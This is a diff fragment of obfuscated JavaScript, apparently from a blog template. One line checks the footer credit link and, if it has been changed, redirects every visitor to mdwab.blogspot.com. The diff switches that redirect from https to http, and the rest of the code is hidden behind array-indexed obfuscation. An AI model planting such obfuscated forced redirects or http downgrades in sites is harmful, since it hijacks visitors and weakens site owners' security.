@@ -87,4 +87,4 @@ var _0x2e7dx15=a(_0x9d6e[1193])[_0x9d6e[305]](0)[_0x9d6e[395]],_0x2e7dx14=_0x9d6
 function a(){igniel()}
 if(localStorage[_0x9d6e[1226]](_0x9d6e[1224])===null){a()}else{window[_0x9d6e[167]]?window[_0x9d6e[167]](_0x9d6e[357],igniel()):window[_0x9d6e[169]]&&window[_0x9d6e[169]](_0x9d6e[758],igniel())}
 function otherScript(){$(function(){$('#comments p').find('a').contents().unwrap();});}
-$(document).ready(function(){if($("#myfooter").attr("href")!="https://mdwab.blogspot.com"){window.location.href="https://mdwab.blogspot.com"}});
+$(document).ready(function(){if($("#myfooter").attr("href")!="http://mdwab.blogspot.com"){window.location.href="http://mdwab.blogspot.com"}});
